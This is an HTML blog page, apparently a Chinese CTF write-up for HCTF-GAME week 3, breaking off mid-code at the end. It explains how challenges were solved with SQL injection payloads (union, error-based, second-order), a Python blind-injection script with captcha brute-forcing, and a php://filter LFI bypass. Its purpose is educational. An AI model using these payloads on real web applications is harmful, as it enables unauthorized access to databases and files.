@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      HCTF-GAME week3 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="从0开始之SQLI之0 题目描述： http://45.32.25.65/nweb/sqli1/?user=user1  打开后加个单引号返回1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use">
+<meta name="keywords" content="CTF,wirteup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF-GAME week3 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/02/06/HCTF-GAME-week3-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="从0开始之SQLI之0 题目描述： http://45.32.25.65/nweb/sqli1/?user=user1  打开后加个单引号返回1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/HCTF_GAME_week3_wp_1.png">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HCTF-GAME week3 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="从0开始之SQLI之0 题目描述： http://45.32.25.65/nweb/sqli1/?user=user1  打开后加个单引号返回1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/HCTF_GAME_week3_wp_1.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">HCTF-GAME week3 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-02-06" class="post-meta__date date">2017-02-06</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/wirteup/">wirteup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="从0开始之SQLI之0"><a href="#从0开始之SQLI之0" class="headerlink" title="从0开始之SQLI之0"></a>从0开始之SQLI之0</h3><blockquote>
+<p>题目描述： <a href="http://45.32.25.65/nweb/sqli1/?user=user1" target="_blank" rel="external">http://45.32.25.65/nweb/sqli1/?user=user1</a></p>
+</blockquote>
+<p>打开后加个单引号返回<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span>user1<span class="string">''' at line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>确定用的是单引号，并且没有什么过滤。尝试 <code>&#39;||&#39;1</code> 来得到当前表中的所有数据，得到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maybe flag is in another space</span><br></pre></td></tr></table></figure></p>
+<p>猜测 flag 在另一张表中，采用联合查询来获取表名、列名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_name,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">hhhhctf	flag</span><br></pre></td></tr></table></figure></p>
+<p>获取 flag<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> hhhhctf%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="从0开始之SQLI之1"><a href="#从0开始之SQLI之1" class="headerlink" title="从0开始之SQLI之1"></a>从0开始之SQLI之1</h3><blockquote>
+<p>题目描述： <a href="http://45.32.25.65/nweb/sqli2/?id=1" target="_blank" rel="external">http://45.32.25.65/nweb/sqli2/?id=1</a></p>
+</blockquote>
+<p>根据 <code>id=2-1</code> 和 <code>1%2b1</code> 的返回结果确定是数字型注入<br>测试了下 name 一列必须返回 <code>user</code> 才显示，那就不能通过直接 union 查询的方式获取了<br>但是单引号还是有错误，那么这里应该是报错注入(显错注入)了，大概就是这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))%23</span><br></pre></td></tr></table></figure></p>
+<p>简单来说，对于 ExtractValue 和 UpdateXML 函数而言，第二个参数值应该是一个 XPATH 表达式，如果不合法(包含特殊符号)，就会报 XPATH 语法错误</p>
+<p>想要知道具体原理的可以看下我以前写的一篇<a href="http://heartsky.info/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84-MySQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">文章</a></p>
+<h3 id="从0开始之SQLI之2"><a href="#从0开始之SQLI之2" class="headerlink" title="从0开始之SQLI之2"></a>从0开始之SQLI之2</h3><blockquote>
+<p>题目描述： 让火焰净化一切…<br><a href="http://45.32.25.65/nweb/sqli3/" target="_blank" rel="external">http://45.32.25.65/nweb/sqli3/</a></p>
+</blockquote>
+<p>题目形式和上题类似，加了个验证码。简单测试下，可以发现没有任何错误回显了，只有 <code>it must return username</code> 的提示，那么就是盲注了，必须要写脚本了 233</p>
+<p>大致思路就是一位一位的选取出表名、列名以及最后的 flag，还是直接贴上脚本吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">HTTP POST</span></span><br><span class="line"><span class="string">盲注</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://45.32.25.65/nweb/sqli3/index.php'</span></span><br><span class="line">pat = <span class="string">'&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=c8qn7ef6lg7pvmof8hnlbhcdb6"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span><span class="params">()</span>:</span></span><br><span class="line">	payload = <span class="string">"-1 UNION SELECT length(DATABASE()),'user'#"</span></span><br><span class="line">	databaseLen = getData(payload)</span><br><span class="line">	database = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(databaseLen)):</span><br><span class="line">		payload = <span class="string">"-1 UNION SELECT ascii(substring(DATABASE(),"</span> + str(i+<span class="number">1</span>) + <span class="string">",1)),'user'#"</span></span><br><span class="line">		ch = getData(payload)</span><br><span class="line">		database += chr(int(ch))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[*] The current database is '</span> + database</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTables</span><span class="params">()</span>:</span></span><br><span class="line">	payload = <span class="string">"-1 UNION SELECT count(*),'user' FROM information_schema.tables WHERE table_schema=DATABASE()#"</span></span><br><span class="line">	tableNumber = getData(payload)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[*] Table number is '</span> + tableNumber</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(tableNumber)):</span><br><span class="line">		tableName = <span class="string">''</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[*] Table name '</span> + str(i) + <span class="string">': '</span>,</span><br><span class="line">		payload = <span class="string">"-1 UNION SELECT length(table_name),'user' FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">		tableLen = getData(payload)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(int(tableLen)):</span><br><span class="line">			payload = <span class="string">"-1 UNION SELECT ascii(substring(table_name,"</span> + str(j+<span class="number">1</span>) + <span class="string">",1)),'user' FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">			ch = getData(payload)</span><br><span class="line">			tableName += chr(int(ch))</span><br><span class="line">		<span class="keyword">print</span> tableName</span><br><span class="line">		getColumns(tableName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span><span class="params">(table)</span>:</span></span><br><span class="line">	payload = <span class="string">"-1 UNION SELECT count(*),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + <span class="string">"'#"</span></span><br><span class="line">	columnNumber = getData(payload)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'  [*] Column number is '</span> + columnNumber</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(columnNumber)):</span><br><span class="line">		columnName = <span class="string">''</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'  [*] Column name '</span> + str(i) + <span class="string">': '</span>,</span><br><span class="line">		payload = <span class="string">"-1 UNION SELECT length(column_name),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + <span class="string">"' LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">		columnLen = getData(payload)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(int(columnLen)):</span><br><span class="line">			payload = <span class="string">"-1 UNION SELECT ascii(substring(column_name,"</span> + str(j+<span class="number">1</span>) + <span class="string">",1)),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + <span class="string">"' LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">			ch = getData(payload)</span><br><span class="line">			columnName += chr(int(ch))</span><br><span class="line">		<span class="keyword">print</span> columnName</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">	payload = <span class="string">"-1 UNION SELECT length(flag),'user' FROM hhhhhhctf#"</span></span><br><span class="line">	flagLen = getData(payload)</span><br><span class="line">	<span class="keyword">print</span> flagLen</span><br><span class="line">	flag = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(flagLen)):</span><br><span class="line">		payload = <span class="string">"-1 UNION SELECT ascii(substring(flag,"</span> + str(i+<span class="number">1</span>) + <span class="string">",1)),'user' FROM hhhhhhctf#"</span></span><br><span class="line">		ch = getData(payload)</span><br><span class="line">		flag += chr(int(ch))</span><br><span class="line">		<span class="keyword">print</span> flag</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[*] The flag is: '</span> + flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(payload)</span>:</span></span><br><span class="line">	r = requests.get(url, headers=headers)</span><br><span class="line">	md5 = r.text.split(<span class="string">'==\''</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">	code = blasting(md5)</span><br><span class="line">	data = &#123;<span class="string">'id'</span>:payload,<span class="string">'code'</span>:code&#125;</span><br><span class="line">	r = requests.post(url, data=data, headers=headers)</span><br><span class="line">	<span class="keyword">return</span> re.search(pat,r.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blasting</span><span class="params">(code)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">		md5 = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">		<span class="keyword">if</span> md5 == code:</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment"># getDatabase()</span></span><br><span class="line">	<span class="comment"># getTables()</span></span><br><span class="line">	<span class="comment"># getFlag()</span></span><br><span class="line">	<span class="keyword">print</span> blasting(<span class="string">'52c8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p>PS: 看你们提交的 wp，都是在一位位的爆破，233</p>
+<h3 id="从0开始LFI之2"><a href="#从0开始LFI之2" class="headerlink" title="从0开始LFI之2"></a>从0开始LFI之2</h3><blockquote>
+<p>题目描述： flag还在../flag.php下，不信你还能拿到 (╯‵□′)╯︵┻━┻<br><a href="http://119.29.138.57:12002/" target="_blank" rel="external">http://119.29.138.57:12002/</a></p>
+</blockquote>
+<p>虽然很多人直接搜到了 payload，还是说下正常解题的思路吧</p>
+<p>打开后首先发现参数名是 img，之前一直是 file(这也算提示了吧)，测试了下就会发现参数必须包含 jpg，否则会出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File not found.</span><br></pre></td></tr></table></figure></p>
+<p>尝试使用 php 伪协议来读取源码，既然有 jpg 的限制，那我们先读下它<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/convert.base64-encode/resource=1.jpg</span><br></pre></td></tr></table></figure></p>
+<p>结果发现仍然返回的是一张图片，这就很奇怪了，不应该返回的是 base64 编码吗，猜测是有什么过滤导致最后还是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>我觉得这里应该是要猜出题者的意图吧，既然你想用 php 伪协议读到源码，那我匹配下，仍然包含后面的不行了，结合对 1.jpg 的测试猜测大致的匹配是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter.*resource=(.*)</span><br></pre></td></tr></table></figure></p>
+<p>根据匹配，然后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/jpg/resource=../flag.php</span><br></pre></td></tr></table></figure></p>
+<p>结果仍然提示 <code>File not found.</code>，说明还有我们没想到的过滤，出题人如果也想到了你会这样做呢，他可能会做出一些过滤来让 resource 后面得是 jpg，而不是 php 什么的，大致有这么个匹配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource/.*jpg</span><br></pre></td></tr></table></figure></p>
+<p>如果参数中有 resource 的话，必须匹配上面才行</p>
+<p>整理下现在得到的分析下，要拿到 flag，必须有 <code>resource=../flag.php</code>，还必须有 <code>resource=jpg</code>，这里就是利用了 php 正则匹配的最大贪婪原则，如果我们这样构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=php://filter/resource=jpg/resource=../flag.php</span><br></pre></td></tr></table></figure></p>
+<p>php 的正则在匹配到 <code>resource=jpg</code> 的时候并没有停下，而是继续向前，直到匹配不到，就返回原来的匹配，如名，返回的是最大长度的匹配</p>
+<p>PS: 当然这都是我 yy 的，忘了哪个 CTF 的题了，我觉得出题者差不多是这么想的吧(逃</p>
+<h2 id="PENTEST"><a href="#PENTEST" class="headerlink" title="PENTEST"></a>PENTEST</h2><h3 id="LoRexxar的渗透之战之一"><a href="#LoRexxar的渗透之战之一" class="headerlink" title="LoRexxar的渗透之战之一"></a>LoRexxar的渗透之战之一</h3><blockquote>
+<p>题目描述： 从这个题目开始将会是一个大型的渗透系列题目，前面遇到的web漏洞将会以不同的方式出现在题目中，你能抓住那些漏洞吗?<br>1、这个站才刚刚开始写，好像还什么都没有啊&gt;x&lt;<br><a href="http://115.28.78.16:13333/d23fd789868fa2c8b3942a811f63adb7/0x01/" target="_blank" rel="external">http://115.28.78.16:13333/d23fd789868fa2c8b3942a811f63adb7/0x01/</a></p>
+</blockquote>
+<p>打开发现，只有一个简单的注册登录功能，还有一个发送验证码的功能，然后抓了个包，发现验证码在源码里，提交并登录，就拿到 flag 了……</p>
+<p>问了下出题人，是这样一种情景。当一个网站在还没有写完，测试的时候还要登录，所以把验证码输出在了源码里</p>
+<h3 id="flag售货机"><a href="#flag售货机" class="headerlink" title="flag售货机"></a>flag售货机</h3><blockquote>
+<p>题目描述： <a href="http://115.28.78.16:13333/b5062b7c25276283ed5f8a5e9026b762/" target="_blank" rel="external">http://115.28.78.16:13333/b5062b7c25276283ed5f8a5e9026b762/</a><br>欢迎来到flag售货机</p>
+</blockquote>
+<p>扫了下，发现 .git 目录存在，于是用 <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a> 拿到源码，主要有这几个文件，也是大致的流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">register.php 注册</span><br><span class="line">login.php 登录</span><br><span class="line">user.php 用户界面</span><br><span class="line">recharge.php 增加金额</span><br><span class="line">buy.php 购买 flag</span><br></pre></td></tr></table></figure></p>
+<p>整个代码写的还是挺清晰的，用户只能增加一次金额，但不够买 flag 的，看下 recharge.php，是通过用户增加金额后就从 volume 表中删除记录，所以不能再次购买了</p>
+<p>注册和登录时都进行了转义，没什么问题，问题在于 recharge.php 对从数据库中取出来的数据进行了使用，你没觉得第3行查询时用的是 <code>$user</code>，到了第7行却用的是 <code>$req[&#39;username&#39;]</code> 很奇怪吗<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"select * from users where username = '&#123;$user&#125;'"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line">$num_results = $result-&gt;num_rows;</span><br><span class="line">$req = $result-&gt;fetch_assoc();</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"select * from volumes where username = '&#123;$req['username']&#125;'"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line">var_dump($result);</span><br><span class="line">$num_results = $result-&gt;num_rows;</span><br><span class="line">var_dump($num_results);</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">$query = <span class="string">"UPDATE `users` SET `balance` = `balance` + 2000000 WHERE id = &#123;$req['id']&#125;"</span>;</span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"DELETE FROM `volumes` WHERE username = '&#123;$req['username']&#125;'"</span>;</span><br><span class="line">			$result = $db-&gt;query($query);</span><br></pre></td></tr></table></figure></p>
+<p>这里的知识点是二次注入，虽然注册时进行了过滤，但入库时是危险的数据，出库时也是危险的数据 </p>
+<p>本地数据库操作下就知道了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into test values(1,1,&apos;\&apos;&apos;);</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 1        | &apos;        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>虽然插入的时候是转义的，存储的时候是没有反斜杠的，所以从数据库取出来数据的时候如果不进行转义等操作，就会造成二次注入</p>
+<p>所以只要构造 payload 让 select 执行，delete 不执行就可以了<br>这就是有趣的地方了，只有 select 支持联合查询，所以当我们构造用户名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;&apos; union select 1,2#</span><br></pre></td></tr></table></figure></p>
+<p>select 成功执行了，但是 delete 因为不支持 union 操作，所以报错，不执行</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p><del>节后综合征，不想写了，明天再写吧(逃</del></p>
+<h3 id="explorer的奇怪番外3"><a href="#explorer的奇怪番外3" class="headerlink" title="explorer的奇怪番外3"></a>explorer的奇怪番外3</h3><blockquote>
+<p>题目描述： <a href="http://121.42.25.113/Feistel/Feistel.html" target="_blank" rel="external">http://121.42.25.113/Feistel/Feistel.html</a></p>
+</blockquote>
+<p>Feisitel 网络，相应的写个解密函数就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(i)^ord(j)) <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HASH</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(data).digest()[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes_encrypt</span><span class="params">(subkeys, data)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    d1 = data[:<span class="number">8</span>]</span><br><span class="line">    d2 = data[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> subkeys:</span><br><span class="line">       d1 = xor(xor(HASH(d2),i),d1)</span><br><span class="line">       d1,d2 = d2,d1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d2 + d1</span><br><span class="line"></span><br><span class="line">d2 = <span class="string">"1fde6a7b2ff15d0a"</span>.decode(<span class="string">'hex'</span>)   </span><br><span class="line">d1 = <span class="string">"bad691215ca5d470"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bes_decrypt</span><span class="params">(d2,d1)</span>:</span></span><br><span class="line">	subKeys = key_schedule(<span class="string">'explorer'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">		d1,d2 = d2,d1</span><br><span class="line">		d1 = xor(xor(d1,subKeys[i]),HASH(d2))</span><br><span class="line">	<span class="keyword">print</span> d2</span><br><span class="line">	<span class="keyword">print</span> d1</span><br><span class="line"></span><br><span class="line"><span class="function"><span 